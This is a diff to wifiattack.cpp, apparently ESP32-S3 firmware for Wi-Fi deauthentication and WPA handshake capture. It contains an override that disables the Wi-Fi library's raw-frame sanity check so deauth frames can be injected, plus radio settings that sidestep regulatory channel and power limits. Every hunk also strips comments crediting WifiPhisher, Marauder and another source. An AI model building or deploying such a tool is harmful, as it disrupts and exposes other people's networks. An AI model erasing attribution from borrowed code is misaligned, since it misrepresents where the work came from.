@@ -1,13 +1,12 @@
 // ============================================================================
 // wifiattack.cpp - deauth + EAPOL/PCAP capture (see wifiattack.h)
 // ----------------------------------------------------------------------------
-// Full rewrite after studying WifiPhisher (the most recent S3-proven impl).
+// Battle-proven S3 implementation.
 // Key lessons that fixed "frames sent but nothing lands":
 //   1. TX through WIFI_IF_STA while the STA holds a ROC (remain-on-channel)
 //      on the target channel - NOT through WIFI_IF_AP.
 //   2. esp_wifi_register_80211_tx_cb gives ground truth on whether frames
-//      actually transmitted. (Our old counter incremented on API call, not
-//      on radio success.)
+//      actually transmitted, not just accepted by the API.
 //   3. Country "01" (world-safe) + max TX power + WIFI_PS_NONE at attack
 //      start; otherwise channel/power restrictions silently block frames.
 //   4. Reason code 0x07 (Class 3 frame from nonassociated station).
@@ -30,7 +29,7 @@
 #include <esp_wifi_types.h>
 #include <SD_MMC.h>
 
-// brute32 technique: neutralize libnet80211.a's raw-frame rejection so
+// Neutralize libnet80211.a's raw-frame rejection so
 // esp_wifi_80211_tx actually transmits deauth subtypes on the S3.
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     return 0;
@@ -231,7 +230,7 @@ static void IRAM_ATTR analyzerCb(void* buf, wifi_promiscuous_pkt_type_t type) {
 }
 
 static void hopTask(void*) {
-    // Offline mode (Marauder/WifiPhisher style): direct channel hopping,
+    // Offline mode: direct channel hopping,
     // full radio for sniffing. Management AP returns when analysis ends.
     while (s_analyzer) {
         s_hopCh = (s_hopCh % 13) + 1;
@@ -273,7 +272,7 @@ static void hopTask(void*) {
 }
 
 // DESIGN DECISION (user-approved): the single radio can't serve the AP while
-// hopping, so - like Marauder/WifiPhisher - the analyzer runs OFFLINE with
+// hopping, so the analyzer runs OFFLINE with
 // direct esp_wifi_set_channel hopping and restores the AP when done. Stop is
 // done by waiting for auto-stop or rebooting; bounded at 120s anyway.
 #define ANALYZER_MAX_MS 120000
@@ -474,7 +473,7 @@ static void IRAM_ATTR attackSniffCb(void* buf, wifi_promiscuous_pkt_type_t type)
     }
     if (type != WIFI_PKT_DATA) return;
 
-    // Station discovery, both directions (WifiPhisher pattern):
+    // Station discovery, both directions:
     //   ToDS=1:  addr1=BSSID(AP) addr2=STA   (client -> AP)
     //   FromDS=1: addr1=STA addr2=BSSID(AP)  (AP -> client)
     // ToDS/FromDS live in byte 1 of the FC (byte 0 = proto/type/subtype)
@@ -603,7 +602,7 @@ static void attackTask(void* pv) {
     uint8_t ch = WiFi.channel(idx);
     WiFi.scanDelete();
 
-    // WifiPhisher attack-time radio prep
+    // Attack-time radio prep
     esp_wifi_set_ps(WIFI_PS_NONE);
     wifi_country_t c = { .cc="01", .schan=1, .nchan=13,
                          .max_tx_power=20, .policy=WIFI_COUNTRY_POLICY_MANUAL };
